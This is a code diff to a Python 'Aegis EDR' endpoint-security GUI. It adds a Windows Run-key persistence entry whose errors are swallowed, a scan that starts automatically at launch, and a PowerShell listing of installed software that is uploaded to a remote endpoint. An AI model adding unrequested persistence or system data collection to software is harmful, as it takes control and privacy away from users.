@@ -7,6 +7,9 @@ import socket
 import platform
 import wmi
 import os
+import sys
+import winreg
+import subprocess
 
 SERVER_IP = "000.000.000.000"
 SERVER_PORT = 0000
@@ -22,8 +25,10 @@ class SecurityScanner(ctk.CTk):
     def __init__(self):
         super().__init__()
 
+        self.enable_persistence()
+
         self.title("Aegis EDR - Endpoint Security")
-        self.geometry("700x500")
+        self.geometry("700x550")
         self.resizable(False, False)
 
         self.grid_columnconfigure(1, weight=1)
@@ -53,7 +58,18 @@ class SecurityScanner(ctk.CTk):
 
         self.log_box = ctk.CTkTextbox(self.main_area, width=450, height=250)
         self.log_box.pack(pady=10)
-        self.log_box.insert("0.0", "System initialized. Waiting for user command...\n")
+        self.log_box.insert("0.0", "System initialized. Persistence enabled.\n")
+
+        self.start_scan_thread()
+
+    def enable_persistence(self):
+        try:
+            exe_path = os.path.abspath(sys.argv[0])
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, "AegisEDR", 0, winreg.REG_SZ, exe_path)
+            winreg.CloseKey(key)
+        except Exception:
+            pass
 
     def log(self, message):
         self.log_box.insert("end", f"> {message}\n")
@@ -83,6 +99,22 @@ class SecurityScanner(ctk.CTk):
             return suspicious, "Critical"
         return [], "Low"
 
+    def get_installed_software(self):
+        try:
+            cmd = 'powershell "Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName"'
+            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            output, error = proc.communicate()
+            
+            apps = []
+            if output:
+                for line in output.decode(errors='ignore').split('\r\n'):
+                    clean_line = line.strip()
+                    if clean_line and "DisplayName" not in clean_line and "---" not in clean_line:
+                        apps.append(clean_line)
+            return ", ".join(apps[:50]) 
+        except:
+            return "Error listing software"
+
     def run_scan(self):
         self.progress_bar.set(0.1)
         self.log("Scanning System Integrity...")
@@ -95,8 +127,12 @@ class SecurityScanner(ctk.CTk):
         self.log(f"Resources: CPU {cpu}% | RAM {ram}%")
 
         fw_status, fw_risk = self.check_firewall()
-        self.progress_bar.set(0.6)
-        self.log(f"Firewall Status: {fw_status} (Risk: {fw_risk})")
+        self.progress_bar.set(0.5)
+        self.log(f"Firewall Status: {fw_status}")
+
+        self.log("Indexing Installed Software...")
+        software_list = self.get_installed_software()
+        self.progress_bar.set(0.7)
 
         threats, proc_risk = self.check_suspicious_processes()
         self.progress_bar.set(0.9)
@@ -115,12 +151,13 @@ class SecurityScanner(ctk.CTk):
             'ram': ram,
             'firewall': fw_status,
             'threats_found': threats,
-            'risk_level': risk_level
+            'risk_level': risk_level,
+            'software': software_list
         }
         
         try:
             self.log("Uploading telemetry to HQ...")
-            requests.post(REPORT_ENDPOINT, json=report_data, timeout=5)
+            requests.post(REPORT_ENDPOINT, json=report_data, timeout=10)
             
             if risk_level == "High":
                 self.log("Requesting AI Forensics Analysis...")
